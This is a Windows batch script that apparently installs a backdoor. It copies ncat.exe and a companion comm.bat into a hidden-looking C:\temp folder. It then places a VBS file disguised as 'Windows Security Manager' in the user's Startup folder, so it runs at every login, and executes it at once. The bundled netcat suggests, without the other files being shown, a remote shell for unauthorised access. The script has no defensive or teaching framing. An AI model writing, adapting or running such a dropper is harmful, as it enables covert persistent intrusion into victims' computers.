@echo off

REM Set the destination directory
set "dest_dir=C:\temp\tmp\access"

REM Create the destination directory if it doesn't exist
if not exist "%dest_dir%" (
    mkdir "%dest_dir%"
    echo Created directory: %dest_dir%
)

REM Copy comm.bat and ncat.exe to the destination directory
copy "%~dp0comm.bat" "%dest_dir%\comm.bat" > nul
copy "%~dp0ncat.exe" "%dest_dir%\ncat.exe" > nul


REM Set the destination directory to the startup folder
set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Copy invis.bat and Windows Security Manager.vbs to the startup folder
copy "%~dp0Windows Security Manager.vbs" "%startup_dir%"

REM Run Windows Security Manager.vbs
cscript "%startup_dir%\Windows Security Manager.vbs"


